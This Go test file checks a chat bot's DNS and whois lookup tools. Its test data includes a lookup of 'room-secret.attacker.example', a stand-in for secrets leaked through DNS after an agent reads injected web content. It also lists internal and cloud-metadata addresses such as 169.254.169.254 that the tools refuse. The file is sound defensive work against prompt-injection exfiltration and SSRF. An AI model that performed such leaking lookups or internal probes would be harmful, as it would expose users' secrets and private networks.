package llmtools

import (
	"context"
	"errors"
	"io"
	"net"
	"strings"
	"testing"

	"github.com/Scrin/siikabot/webfetch"
)

// restrictedTurn is the context of a turn that has read a web page mentioning example.com
func restrictedTurn() context.Context {
	return webfetch.WithProvenance(context.Background(), webfetch.NewProvenance(true, "See https://www.example.com/a"))
}

// A lookup tells whoever runs a name everything in it, so once a turn has read content from the web, it looks
// up only names it has seen. Nothing here reaches the network: the names are refused first.
func TestLookupsRefuseNamesTheTurnHasntSeen(t *testing.T) {
	for _, test := range []struct {
		tool      string
		handler   func(context.Context, string) (string, error)
		arguments string
	}{
		{"dns_lookup", handleDNSToolCall, `{"domain":"room-secret.attacker.example"}`},
		{"whois_lookup", handleWhoisToolCall, `{"query":"room-secret.attacker.example"}`},
		{"whois_lookup", handleWhoisToolCall, `{"query":"192.0.2.77"}`},
	} {
		result, err := test.handler(restrictedTurn(), test.arguments)
		if err != nil || result != webfetch.DeniedNameMessage {
			t.Errorf("%s(%s) = %q, %v, want it refused", test.tool, test.arguments, result, err)
		}
	}
}

// The resolver the bot uses knows its own network's names, such as the other containers'
func TestDNSLookupRefusesNamesThatArentPublic(t *testing.T) {
	for _, domain := range []string{"siikabot-postgres", "host.docker.internal", "printer.local", "router.lan",
		"nas.home.arpa", "localhost", "10.0.0.1", "::1"} {
		result, err := handleDNSToolCall(context.Background(), `{"domain":"`+domain+`"}`)
		if err != nil || !strings.Contains(result, "isn't a public domain name") {
			t.Errorf("dns_lookup(%s) = %q, %v, want it refused", domain, result, err)
		}
	}
}

func TestIsPublicDomain(t *testing.T) {
	for domain, public := range map[string]bool{
		"example.com":         true,
		"www.yle.fi":          true,
		"yle.fi.":             true,
		"fi":                  true,
		"scrin.github.io":     true,
		"example.co.uk":       true,
		"siikabot-postgres":   false,
		"db.internal":         false,
		"printer.local":       false,
		"nas.home.arpa":       false,
		"something.cromulent": false,
		"127.0.0.1":           false,
		"":                    false,
	} {
		if got := isPublicDomain(domain); got != public {
			t.Errorf("isPublicDomain(%q) = %v, want %v", domain, got, public)
		}
	}
}

// Referrals in whois records can name any host and port, and the record's holder chooses some of them
func TestWhoisDialerConnectsOnlyToPublicWhoisServers(t *testing.T) {
	dialer := whoisDialer{ctx: context.Background()}
	for _, address := range []string{"127.0.0.1:43", "10.0.0.5:43", "[::1]:43", "169.254.169.254:43", "192.0.2.1:6379"} {
		if conn, err := dialer.Dial("tcp", address); err == nil {
			conn.Close()
			t.Errorf("Dial(%s) connected", address)
		}
	}
}

func TestLimitedConnReadsOnlySoMuch(t *testing.T) {
	server, client := net.Pipe()
	go func() {
		_, _ = server.Write([]byte(strings.Repeat("x", 100)))
		server.Close()
	}()
	conn := &limitedConn{Conn: client, remaining: 10, stop: func() bool { return true }}
	data, err := io.ReadAll(conn)
	if err != nil && !errors.Is(err, io.EOF) {
		t.Fatalf("ReadAll() error = %v", err)
	}
	if len(data) != 10 {
		t.Errorf("read %d bytes, want 10", len(data))
	}
	conn.Close()
}
